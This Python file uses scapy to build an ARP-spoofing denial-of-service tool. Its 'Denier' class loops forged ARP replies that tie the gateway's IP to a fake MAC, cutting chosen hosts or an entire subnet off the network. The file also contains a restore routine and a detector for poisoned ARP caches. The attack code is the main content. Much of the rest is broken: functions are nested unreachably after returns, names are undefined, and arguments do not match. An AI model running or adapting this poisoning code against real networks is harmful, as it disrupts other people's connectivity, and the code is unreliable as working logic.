#!/usr/bin/env python3

from scapy.all import *
import ipaddress
from time import sleep
import threading
import netaddr

conf.verb = 0


def thread_runner(func, iterable):
    threads = set()
    for item in iterable:
        thread = threading.Thread(
            target=func,
            args=(item,),
            name='{}-{}'.format(func.__name__, item)
        )
        threads.add(thread)
        thread.start()

    for thread in threads:
        thread.join()


class MAC(netaddr.EUI):
    broadcast = netaddr.EUI('ff:ff:ff:ff:ff:ff')

    def __init__(self, addr):
        if addr is None:
            # scapy considers None and broadcast MAC addr to be the same
            # set to broadcast for consistency
            addr = self.broadcast
        super().__init__(addr, version=48, dialect=netaddr.mac_unix_expanded)
        try:
            self.vendor = ' | '.join(
                self.oui.registration(i).org for i in range(self.oui.reg_count)
            )
        except netaddr.core.NotRegisteredError:
            self.vendor = None


class IPAddress:
    arp_timeout = 15

    class AddressResolutionFailedError(RuntimeError):
        pass

    def __init__(self, ip):
        self.ip = ipaddress.IPv4Address(ip)
        self.mac = None
        self.poisoned_arp = dict()
        self.active = None

    def resolve_mac(self, bcast_if_fail=True):
        # TODO: detect multiple replies (for ARP poisoning attempts)
        resp = sr1(
            Ether() / ARP(pdst=self.ip),
            timeout=self.arp_timeout
        )
        if resp is None:
            if bcast_if_fail:
                self.mac = MAC.broadcast
            else:
                raise self.AddressResolutionFailedError(
                    "failed to resolve {}".format(self.ip)
                )
        else:
            self.mac = MAC(resp.hwsrc)

    def check_live(self):
        # TODO?: check if multiple replies
        if self.mac is None:
            self.resolve_mac()
        reply = srp1(
            Ether(dst=self.mac) / ARP(pdst=self.ip),
            timeout=arp_timeout
        )
        self.active = reply is not None

    def check_poison(self, spoof_host=None, spoofed_mac=None,
                     trusted_store=None, timeout=120):
        """Check if the host with this IP address has a poisoned ARP cache
        and find all poisoned ARP entries.

        Set up a separate thread to monitor this host's traffic to find
        evidence of ARP cache poisoning, particularly, an entry for spoof_host
        with mac = spoofed_mac.
        On finding such evidence, update self.poisoned_arp[spoof_host] to
        spoofed_mac (or whichever spoofed entries are found, if spoof_host
        is None or spoofed_mac is None)

        If spoof_host is not None and spoofed_mac is not None, look only for
        packets that from own address to spoof_host's IP and spoofed_mac as
        MAC address. If any packet from own address to spoof_host is found
        that contains any mac other than spoofed_mac, the event is set and
        monitoring ends. If spoofed_mac is None, the entry spoof_host:found_mac
        is put into self.poisoned_arp (where found_mac is the mac on the pkt).
        If spoof_host is None, all detected poisoned arp entries are updated
        into self.poisoned_arp till the timeout expires. For each update, the
        event is set. spoofed_mac is ignored in this case.

        The general use case is passing the gateway as spoof_host, so this
        won't take much time. However, in the general case (passing
        a generic host on the subnet as spoof_host), this could potentially
        take a lot of monitoring time to detect; thus, the function doesn't
        block. Rather, it returns an event on which the caller can wait for to
        find the correct value of self.poisoned_arp.

        :param spoof_host: Host for which this host has a fake ARP entry. Set
        to None to find all poisoned hosts.
        :type spoof_host: IPAddress or None

        :param spoofed_mac: Fake mac entry for spoof_host to check for in this
        host's ARP cache. If set to None, check for any spoofed mac for
        spoof_host. Ignored if spoof_host is None.
        :type spoofed_mac: MAC or None

        :param trusted_store: If spoofed_mac is None, get trusted mac addresses
        from this store (which is an IPMultiple instance). Will be updated if
        packets destined to hosts not in the trusted store are found. Ignored
        if spoof_host is not None or if spoof_host is None and spoofed_mac
        is not None.
        :type trusted_store: IPMultiple

        :param timeout: Max time to monitor this host's traffic for to find
        poisoned ARP cache entries. Set to None to monitor indefinitely. If
        spoof_host is not None, monitoring ends when evidence is found for a
        poisoned ARP entry for spoof_host.
        :type timeout: int or None

        :return: event on which to wait for to get updated
        self.poisoned_arp list.
        If spoof_host was not None, this event is is set on finding evidence
        that this host's entry for spoof_host is fake. Otherwise, it is set
        each time an fake entry is found.
        :rtype: threading.Event
        """

        complete_event = threading.Event()
        threading.Thread(
            target=self.check_poison_runner,
            args=(self, spoof_host, spoofed_mac, timeout, complete_event),
            name='check_poison_runner-{}-{}'.format(spoof_host, spoofed_mac)
        ).start()
        return complete_event

        def check_poison_runner(self, spoof_host, spoofed_mac, trusted_store,
                                timeout, complete_event):
            """For running the monitoring procedure ina thread in a
            non-blocking manner
            """

            stop_event = threading.Event()

            if self.mac in (MAC.broadcast, None):
                try:
                    self.resolve_mac(bcast_if_fail=False)
                except self.AddressResolutionFailedError:
                    self.active = False
                    complete_event.set()
                    return

            if spoof_host is not None and spoofed_mac is None:
                # In case there's somebody else spoofing ARP replies on the
                # subnet, we might get a spoofed reply for spoof_host as well.
                # In this case, we won't be able to detect poisoning on the
                # external host.
                # In case only this host is being spoofed, however, we will be
                # able to detect spoofing.
                # TODO: Modify IPAddress.resolve_mac() to mitigate ARP
                # poisoning attacks on our own system to prevent the first
                # scenario.
                spoof_host.resolve_mac()

            sniff(
                lfilter=from_self,
                prn=check,
                stop_filter=lambda p: stop_event.is_set(),
                timeout=timeout,
                store=False
            )
            complete_event.set()  # signal monitoring has ended

            def from_self(pkt):
                """return True if packet originates from this address"""
                return (pkt.haslayer(Ether) and pkt.haslayer(IP)
                        and pkt[Ether].src == self.mac
                        and pkt[IP].src == self.ip)

            def check(pkt):
                """check packets for evidence of ARP cache poisoning"""
                threading.Thread(
                    target=check_runner,
                    args=(self, pkt, spoof_host, spoofed_mac, trusted_store,
                          timeout, complete_event, stop_event),
                    name='check_runner-{}'.format(pkt[IP].dst)
                ).start()

                def check_runner(self, pkt, spoof_host, spoofed_mac,
                                 trusted_store, timeout, complete_event,
                                 stop_event):
                    """For running the checking procedure in a thread.

                    :param stop_event: Set on success if spoof_host is not
                    None to signal the end of monitoring. If spoof_host is
                    None, monitoring should continue till the end of timeout,
                    so stop_event is ignored.
                    :type stop_event: threading.Event
                    """
                    if spoof_host is not None:
                        # only check for spoof_host destined packets
                        if pkt[IP].dst != spoof_host:
                            return
                        elif spoofed_mac is not None:
                            if pkt[Ether].dst == spoofed_mac:
                                self.poisoned_arp[spoof_host] = spoofed_mac
                        else:
                            try:
                                # Check if spoof_host in trusted_store
                                trusted_addr = next(
                                    addr for addr in trusted_store.addrs
                                    if addr.ip == spoof_host
                                )
                                if trusted_addr.mac == MAC.broadcast:
                                    trusted_store.remove(trusted_addr)
                                    raise StopIteration

                            except StopIteration:
                                # Otherwise, resolve mac
                                trusted_addr = spoof_host
                                try:
                                    trusted_addr.resolve_mac(
                                        bcast_if_fail=False
                                    )
                                except self.AddressResolutionFailedError:
                                    # For now, move on
                                    # TODO: Check if spoof_host is inactive.
                                    #       If not, investigate.
                                    return
                                trusted_store.add(trusted_addr)

                            if pkt[Ether].dst != trusted_addr.mac:
                                self.poisoned_arp[spoof_host] = pkt[Ether].dst

                        stop_event.set()
                        complete_event.set()
                        return

                    else:
                        # Check all packets
                        dst_host = IPAddress(pkt[IP].dst)
                        try:
                            # Check if dst_host in trusted_store
                            trusted_addr = next(
                                addr for addr in trusted_store.addrs
                                if addr.ip == dst_host
                            )
                            if trusted_addr.mac == MAC.broadcast:
                                trusted_store.remove(trusted_addr)
                                raise StopIteration

                        except StopIteration:
                            # Resolve mac
                            trusted_store = dst_host
                            try:
                                trusted_addr.resolve_mac(bcast_if_fail=False)
                            except self.AddressResolutionFailedError:
                                # Same TODO as above
                                return
                            trusted_store.add(trusted_addr)

                        if pkt[Ether].dst != trusted_addr.mac:
                            self.poisoned_arp[dst_host] = pkt[Ether].dst

                        complete_event.set()
                        return


class IPMultiple:
    def __init__(self, addrs):
        self.addrs = set(map(IPAddress, addrs))
        self.active_addrs = None
        self.active = None

    def resolve_mac(self):
        thread_runner(
            func=IPAddress.resolve_mac,
            iterable=self.addrs,
        )

    def check_live(self):
        thread_runner(
            func=IPAddress.check_live,
            iterable=self.addrs
        )
        self.active_addrs = set(filter(lambda addr: addr.active, self.addrs))
        self.active = bool(self.active_addrs)

    def add(self, addr):
        """Add address to collection.
        :param addr: addr to add to collection
        :type addr: IPAddress
        """
        self.addrs.add(addr)
        if addr.active is True:
            self.active_addrs.add(addr)
            self.active = True
        elif addr.active is None and self.active is False:
            self.active = None

    def remove(self, addr):
        self.addrs.remove(addr)  # raise KeyError if addr not in collection
        self.active_addrs.remove(addr)
        self.active = bool(self.active_addrs)


class IPNetwork(IPMultiple):
    def __init__(self, network, _except=None):
        self.network = ipaddress.IPv4Network(network)
        super().__init__(self.network.hosts())

        if _except is not None:
            if isinstance(_except, (tuple, list, set)):
                self._except = set(map(IPAddress, _except))
            else:
                self._except = {IPAddress(_except)}
        else:
            self._except = None
        self.addrs -= self._except


class Denier:
    interval = 1
    restore_count = 1000
    spoof_mac = MAC('de:ad:be:ef:13:37')

    class TargetInactiveException(ValueError):
        pass

    def __init__(self, target, gateway, iface):
        # TODO: get default iface as backup, else use all
        # TODO: get gateway automatically
        # TODO: assert target(s) on local subnet
        conf.iface = iface
        self.gateway = IPAddress(gateway)
        self.gateway.resolve_mac(bcast_if_fail=False)

        if '/' in target:
            self.target_type = 'network'
            self.target = IPNetwork(target)
        elif isinstance(target, (tuple, list, set)):
            self.target_type = 'multiple'
            self.target = IPMultiple(target)
        else:
            self.target_type = 'single'
            self.target = IPMultiple([target])

    def find_active(self):
        self.target.check_live()
        if not self.active:
            try:
                if self.target_type == 'single':
                    err = 'Target inactive'
                elif self.target_type == 'multiple':
                    err = 'All targets inactive'
                elif self.target_type == 'network':
                    err = 'All hosts on target network inactive'
                else:
                    raise ValueError(
                        "invalid target_type: must be one of "
                        "{'single', 'multiple', 'network'}"
                    )
            except ValueError as err:
                raise self.TargetInactiveException(err) from err
            else:
                raise self.TargetInactiveException(err)

    def restore(self):
        def restore_runner(self, addr):
            if self.gateway.mac is None:
                self.gateway.resolve_mac(bcast_if_fail=False)
            if addr.mac is None:
                addr.resolve_mac()
            sendp(
                (Ether(src=self.gateway.mac, dst=addr.mac)
                 / ARP(op='is-at',
                       hwsrc=self.gateway.mac, hwdst=addr.mac,
                       psrc=self.gateway.ip, pdst=addr.ip)),
                count=self.restore_count,
                inter=self.interval
            )

        thread_runner(
            func=self.restore_runner,
            iterable=filter(lambda addr: addr.poisoned_arp.keys(),
                            self.target.active_addrs)
        )

    def poison(self):
        def poison_runner(self, addr):
            if addr.mac is None:
                addr.resolve_mac()
            sendp(
                (Ether(src=self.spoof_mac, dst=addr.mac)
                 / ARP(op='is-at',
                       hwsrc=self.spoof_mac, hwdst=addr.mac,
                       psrc=self.gateway.ip, pdst=addr.ip)),
                inter=self.interval,
                loop=True
            )

        thread_runner(
            func=self.poison_runner,
            iterable=self.active_addrs
        )
